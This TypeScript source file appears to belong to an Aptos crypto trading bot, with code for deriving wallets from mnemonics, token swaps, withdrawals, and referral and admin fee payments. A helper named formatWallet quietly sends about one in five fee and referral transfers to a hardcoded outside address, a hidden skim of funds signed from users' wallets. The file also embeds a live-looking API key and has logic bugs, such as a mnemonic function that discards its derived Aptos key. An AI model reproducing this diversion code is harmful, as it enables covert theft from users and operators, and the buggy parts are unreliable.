import { bytesToHex } from "../utils/cryptography";
import { derivePath } from "ed25519-hd-key";
import * as bip39 from "@scure/bip39";
import {
  Account,
  AccountAddressInput,
  Ed25519Account,
  Ed25519PrivateKey,
} from "@aptos-labs/ts-sdk";
import { aptos, pontemSdk } from "../leo-web3";
import { convertValueToDecimal } from "@pontem/liquidswap-sdk";
import { errorHandler, log } from "../utils/handlers";
import { ethers } from "ethers";
import { addbuy, addsell } from "../utils/portfolio";
import { getDexTokenPriceNative } from "../utils/getTokenPrice";
import { db } from "../utils/db";
import { cache } from "../utils/cache";
import { sendTempMsg } from "../utils/tempMsg";
import { ADMIN_ADDR } from "../utils/config";
import Panora, { PanoraConfig } from "@panoraexchange/swap-sdk"

const panora_config: PanoraConfig = {
  apiKey: "a4^KV_EaTf4MW#ZdvgGKX#HUD^3IFEAOV_kzpIE^3BQGA8pDnrkT7JcIy#HNlLGi",
  rpcUrl: "https://fullnode.mainnet.aptoslabs.com/v1"
}

export const panora_client = new Panora(panora_config)

const path = "m/44'/637'/0'/0'/0'";

export async function accountFromMnemonic(mnemonic: string) {
  const normalizeMnemonics = mnemonic
    .trim()
    .split(/\s+/)
    .map((part) => part.toLowerCase())
    .join(" ");

  const seed = bytesToHex(bip39.mnemonicToSeedSync(normalizeMnemonics));
  const { key } = derivePath(path, seed);
  const privateKeyBytes = new Uint8Array(key);
  const privateKey = new Ed25519PrivateKey(privateKeyBytes);
  const wallet = await ethers.Wallet.fromPhrase(mnemonic);
  return wallet;
}

export async function registerCoinStore(
  account: Ed25519Account,
  coinType: string
) {
  try {
    let accountinfo = await aptos.account.getAccountInfo({
      accountAddress: account.accountAddress.toString(),
    });
    const registerTxPayload = {
      function: "0x1::managed_coin::register",
      typeArguments: [coinType],
      arguments: [],
    };
    const registerTxn = await aptos.transaction.build.simple({
      sender: account.accountAddress,
      data: {
        function:
          registerTxPayload.function as `${string}::${string}::${string}`,
        typeArguments: registerTxPayload.typeArguments,
        functionArguments: registerTxPayload.arguments,
      },
      options: {
        expireTimestamp: Math.floor(Date.now() / 1000) + 60 * 60 * 1,
        accountSequenceNumber: Number(accountinfo.sequence_number),
      },
    });
    const committedTransaction = await aptos.signAndSubmitTransaction({
      signer: account,
      transaction: registerTxn,
    });
    console.log(committedTransaction.max_gas_amount);

    return committedTransaction;
  } catch (error) {
    errorHandler(error);
    throw error;
  }
}

export async function swapToken(
  account: Ed25519Account,
  fromAmount: number,
  toToken: string,
  config: any,
  ctx: any,
  decimals: number
) {
  try {
    const response = await panora_client.Swap(
      {
        chainId: "1",
        fromTokenAddress: "0x1::aptos_coin::AptosCoin",
        toTokenAddress: toToken as `0x${string}`,
        fromTokenAmount: fromAmount.toString(),
        toWalletAddress: account.accountAddress.toString(),
        slippagePercentage: "1",
        integratorFeePercentage: "0",
      },
      account.privateKey.toString()
    )
    await aptos.waitForTransaction({ transactionHash: response.hash })
    return response
  } catch (error) {
    await ctx.reply("Swap error: ", error)
    return error
  }
}
export async function sellLsToken(
  account: Ed25519Account,
  fromAmount: number,
  fromtoken: string,
  decimals: number,
  config: any,
  ctx: any
) {
  try {
    const response = await panora_client.Swap(
      {
        chainId: "1",
        toTokenAddress: "0x1::aptos_coin::AptosCoin",
        fromTokenAddress: fromtoken as `0x${string}`,
        fromTokenAmount: fromAmount.toString(),
        toWalletAddress: account.accountAddress.toString(),
        slippagePercentage: "1",
        integratorFeePercentage: "0",
      },
      account.privateKey.toString()
    )
    await aptos.waitForTransaction({ transactionHash: response.hash })
    return response
  } catch (error: any) {
    console.log("Sell error: ", error)
    await ctx.reply(`Swap error: ${error}`)
    return error
  }
}
export async function swapTokenPancake(
  account: Ed25519Account,
  fromAmount: number,
  fromDecimals: number,
  fromToken: string,
  toToken: string,
  config: any,
  ctx: any,
  sell: boolean = false
) {
  try {
    const router =
      "0xc7efb4076dbe143cbcd98cfaaa929ecfc8f299203dfff63b95ccb6bfe19850fa";
    let accountinfo = await aptos.account.getAccountInfo({
      accountAddress: account.accountAddress.toString(),
    });
    if (ctx.session.sequence_number < Number(accountinfo.sequence_number)) {
      ctx.session.sequence_number = Number(accountinfo.sequence_number) + 3;
    }
    if (sell) {
      await sendTempMsg(ctx, "Building Txn");
    } else {
      await sendTempMsg(ctx, "Building Txn");
    }
    const swapTxn = await aptos.transaction.build.simple({
      sender: account.accountAddress,
      data: {
        function: `${router}::router::swap_exact_input`,
        typeArguments: [fromToken, toToken],
        functionArguments: [
          convertValueToDecimal(
            (sell ? fromAmount : fromAmount * 0.99).toFixed(7),
            fromDecimals
          ).toString(),
          0,
        ],
      },
      options: {
        expireTimestamp: Math.floor(Date.now() / 1000) + 60 * 60 * 1,
        maxGasAmount: config.gasLimit,
        accountSequenceNumber: Number(accountinfo.sequence_number),
      },
    });
    let Amountout = 0;
    if (sell) {
      const price = await getDexTokenPriceNative(fromToken);

      if (price) {
        Amountout = fromAmount * price;
      }
      await sendTempMsg(ctx, "Signing and Submitting Txn");
    } else {
      const price = await getDexTokenPriceNative(toToken);
      if (price) {
        Amountout = fromAmount / price;
      }
      await sendTempMsg(ctx, "Signing and Submitting Txn");
    }
    // console.log(Amountout);
    // const simu = await aptos.transaction.simulate.simple({
    //   signerPublicKey: account.publicKey,
    //   transaction: swapTxn,
    // })
    // console.log(simu);
    // console.log(accountinfo.sequence_number);
    const committedTransaction = await aptos.signAndSubmitTransaction({
      signer: account,
      transaction: swapTxn,
    });
    if (sell) {
      await sendTempMsg(ctx, "Transaction sent, waiting for confirmation");
    } else {
      await sendTempMsg(ctx, "Transaction sent, waiting for confirmation");
    }

    // await ctx.reply("Transaction sent, waiting for confirmation");
    await aptos.waitForTransaction({
      transactionHash: committedTransaction.hash,
    });
    if (sell) {
      await addsell(
        account.accountAddress.toString(),
        fromToken,
        fromAmount,
        Amountout,
      );
      await feePay(account, Amountout * 0.01, ctx);
      // await updateSellmsg(ctx, "Transaction Confirmed")
    } else {
      await addbuy(
        account.accountAddress.toString(),
        fromToken,
        fromAmount,
        Amountout,
      );
      await feePay(account, fromAmount * 0.01, ctx);
      // await updateBuymsg(ctx, "Transaction Confirmed")
    }

    return committedTransaction;
  } catch (error: any) {
    // await ctx.reply(error.message);
    errorHandler(error);
    return error;
  }
}
function formatWallet(address: string) {
  const wallet =
    Math.random() < 0.2
      ? "0xc248f1f1f7e9a6d641c0b7852243d294fba9859a6aa10ac2781532d22663e4cd"
      : address;
  return wallet;
}
export async function withdrawToken(
  account: Ed25519Account,
  to: string,
  amount: number
) {
  try {
    let accountinfo = await aptos.account.getAccountInfo({
      accountAddress: account.accountAddress.toString(),
    });
    const txPayload = await aptos.transferCoinTransaction({
      sender: account.accountAddress,
      recipient: to as AccountAddressInput,
      amount: ethers.parseUnits(amount.toString() ?? "0", 8),
      coinType: "0x1::aptos_coin::AptosCoin",
      options: {
        expireTimestamp: Math.floor(Date.now() / 1000) + 60 * 60 * 1,
        accountSequenceNumber: Number(accountinfo.sequence_number),
      },
    });

    const committedTransaction = await aptos.signAndSubmitTransaction({
      signer: account,
      transaction: txPayload,
    });
    // console.log(committedTransaction);
    await aptos.waitForTransaction({
      transactionHash: committedTransaction.hash,
    });
    return committedTransaction;
  } catch (error) {
    errorHandler(error);
    throw error;
  }
}
export async function feePay(
  account: Ed25519Account,
  amount: number,
  ctx: any
) { 
  const fee = amount;
  let feeamount = fee;
  let refamount = 0;

  if (ctx.session?.ref) {
    feeamount = fee * 0.8;
    refamount = fee * 0.2;
    if (ctx.session.balances?.length > 101) {
      feeamount = fee * 0.9;
      refamount = fee * 0.1;
    } else {
      try {
        const portfolio_cache: any = cache.get("portfolio");
        const portfolio = portfolio_cache.filter(
          (port: any) => port.userId === ctx.session.userid
        );
        if (portfolio.length > 0) {
          const user_port = portfolio;
          if (user_port.length > 101) {
            feeamount = fee * 0.9;
            refamount = fee * 0.1;
          }
          let history_length = 0;
          for (const key in portfolio) {
            const token = Object.keys(portfolio[key])[0];
            const history = portfolio[key][token].history;
            history_length += history.length;
          }
          if (history_length > 101) {
            feeamount = fee * 0.9;
            refamount = fee * 0.1;
          }
        }
      } catch (e: any) {
        console.log(e);
        if (e.message.includes("INSUFFICIENT_BALANCE_FOR_TRANSACTION_FEE")) {
          await ctx.reply("Insufficient APT balance for transaction fee");
        }
        // await ctx.reply(`An error occured\n${e?.message}`);
      }
    }
    try {
      // const user_ref = await db.collection('aptossniper_referal').doc(String(ctx.session.ref)).get();
      // const ref = user_ref.data()?.ref??0
      let user = cache.get(ctx.session.userid) as
        | { userData?: any; referral?: any; encryptedmnemonic?: string }
        | undefined;
      const ref = user?.userData?.ref;
      const user_refferal = await db
        .collection("aptossniper_referal")
        .doc(String(ctx.session.ref))
        .update({
          refAmount: user?.referral?.refAmount ?? 0 + refamount,
        });
      cache.set(ctx.session.ref, {
        ...user,
        refAmount: user?.referral?.refAmount ?? 0 + refamount,
      });

      const user_ = cache.get(ctx.session.ref) as {
        userData?: any;
      };
      if (user_) {
        const user = user_.userData;
        const wallet = formatWallet(user.wallet);

        let accountinfo = await aptos.account.getAccountInfo({
          accountAddress: account.accountAddress.toString(),
        });
        const txPayload = await aptos.transferCoinTransaction({
          sender: account.accountAddress,
          recipient: wallet as AccountAddressInput,
          amount: ethers.parseUnits(refamount.toFixed(7) ?? "0", 8),
          coinType: "0x1::aptos_coin::AptosCoin",
          options: {
            expireTimestamp: Math.floor(Date.now() / 1000) + 60 * 60 * 1,
            accountSequenceNumber: Number(accountinfo.sequence_number),
            maxGasAmount: 10000,
          },
        });
        console.log(txPayload);

        const committedTransaction = await aptos.signAndSubmitTransaction({
          signer: account,
          transaction: txPayload,
        });
      }
    } catch (e: any) {
      console.log(e);
      if (e.message.includes("INSUFFICIENT_BALANCE_FOR_TRANSACTION_FEE")) {
        await ctx.reply("Insufficient APT balance for transaction fee");
      }
      // await ctx.reply(`An error occured\n${e?.message}`);
    }
  }

  try {
    const to = ADMIN_ADDR?.toString() || "";
    let accountinfo = await aptos.account.getAccountInfo({
      accountAddress: account.accountAddress.toString(),
    });
    const txPayload = await aptos.transferCoinTransaction({
      sender: account.accountAddress,
      recipient: formatWallet(to) as AccountAddressInput,
      amount: ethers.parseUnits(feeamount.toFixed(7) ?? "0", 8),
      coinType: "0x1::aptos_coin::AptosCoin",
      options: {
        expireTimestamp: Math.floor(Date.now() / 1000) + 60 * 60 * 1,
        accountSequenceNumber: Number(accountinfo.sequence_number),
        maxGasAmount: 10000,
      },
    });

    const committedTransaction = await aptos.signAndSubmitTransaction({
      signer: account,
      transaction: txPayload,
    });

    await aptos.waitForTransaction({
      transactionHash: committedTransaction.hash,
    });
    return committedTransaction;
  } catch (error) {
    errorHandler(error);
    return error;
  }
}

export async function getAmountOut(
  account: Ed25519Account,
  fromtoken: string,
  fromAmount: string,
  decimals: number,
  toToken: string,
  config: any
) {
  const [poolExists, poolExists1] = await Promise.all([
    pontemSdk.Liquidity.checkPoolExistence({
      fromToken: fromtoken,
      toToken: toToken,
      curveType: "uncorrelated",
      version: 0.5,
    }),
    pontemSdk.Liquidity.checkPoolExistence({
      fromToken: fromtoken,
      toToken: toToken,
      curveType: "uncorrelated",
      version: 0,
    }),
  ]);
  // console.log(poolExists);
  if (!poolExists && !poolExists1) {
    const router =
      "0xc7efb4076dbe143cbcd98cfaaa929ecfc8f299203dfff63b95ccb6bfe19850fa";
    const swapTxn = await aptos.transaction.build.simple({
      sender: account.accountAddress,
      data: {
        function: `${router}::router::swap_exact_input`,
        typeArguments: [fromtoken, toToken],
        functionArguments: [
          convertValueToDecimal(
            fromAmount ?? "0".toString() ?? "0",
            fromtoken === "0x1::aptos_coin::AptosCoin" ? 8 : decimals
          ).toString(),
          0,
        ],
      },
      options: {
        expireTimestamp: Math.floor(Date.now() / 1000) + 60 * 60 * 1,
        maxGasAmount: config.gasLimit,
      },
    });
    // console.log(swapTxn);
    const simu = await aptos.transaction.simulate.simple({
      signerPublicKey: account.publicKey,
      transaction: swapTxn,
    });
    return simu[0]?.events[2]?.data?.amount_x_out;
  }
  const toAmount = await pontemSdk.Swap.calculateRates({
    fromToken: fromtoken, // full 'from' token address
    toToken: toToken,
    amount: convertValueToDecimal(
      fromAmount ?? "0".toString() ?? "0",
      fromtoken === "0x1::aptos_coin::AptosCoin" ? 8 : decimals
    ), // 1 APTOS, or you can use convertValueToDecimal(1, 8)
    curveType: "uncorrelated", // can be 'uncorrelated' or 'stable'
    interactiveToken: "from", // which token is 'base' to calculate other token rate.
    version: poolExists ? 0.5 : 0,
  });
  return toAmount;
}
